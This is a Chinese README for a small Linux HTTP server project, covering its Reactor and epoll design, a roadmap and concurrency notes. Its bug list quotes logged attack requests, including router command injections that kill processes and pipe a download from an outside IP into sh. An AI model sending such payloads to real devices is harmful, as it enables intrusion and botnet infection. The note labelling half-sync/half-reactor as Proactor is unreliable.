# MyWeb

## 1、开发进度

本项目开发了一个基于Linux平台的轻量级HTTP服务器
* 采用了Reactor高并发模型
* 支持Select、Poll、Epoll三种IO复用方式
* 服务器通过状态机解析HTTP请求报文
* 使用自动增长的缓冲区来提升性能稳定性
* 通过WebBench对服务器进行了性能和压力测试，确保了其稳定性和可靠性。

计划：
* 引入MySQL，实现一个注册登录界面
* 处理POST请求
* 定时器
* 日志系统
* 实现Proactor模型
* 消息队列
* 分布式

奇怪的get请求，接收到以后，服务器就会挂，慢慢解决
* GET /.env HTTP/1.0
* GET /portal/redlion HTTP/1.0
* GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.0
* GET http://www.ys168.com/?0.301155930654163458905783120 HTTP/1.1
* GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.31%2Ft%7Csh%3B%60) HTTP/1.0
* HEAD / HTTP/1.0


## 2、理论基础

(三种IO多路复用技术)[https://github.com/Dream-ming/Learning_Note/blob/main/%E7%BD%91%E7%BB%9C/Socket/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/README.md]

### 同步/异步，阻塞/非阻塞
* 同步
  * 指程序完全按照代码序列的顺序执行
* 异步
  * 指程序的执行需要由系统事件驱动
* 半同步半异步模式 (Reactor)
  * 同步线程用于处理客户逻辑
  * 异步线程用于处理I/O事件
  * 异步线程监听到客户请求后，就将其封装成请求对象并插入请求队列中
  * 请求队列将通知某个工作在同步模式的工作线程来读取并处理该请求对象
* 半同步半反应堆模式 (Proactor)
  * 主线程充当异步线程，负责监听所有 socket 的读写事件
  * 若有新的连接到来，主线程接收，并往 epoll 内核事件表中注册该事件
  * 若有读写事件发生，主线程从 socket 上接收数据，并将其封装成请求对象，插入请求队列当中
  * 所有工作线程睡眠在请求队列上，竞争处理请求队列上的任务

### HTTP 报文格式
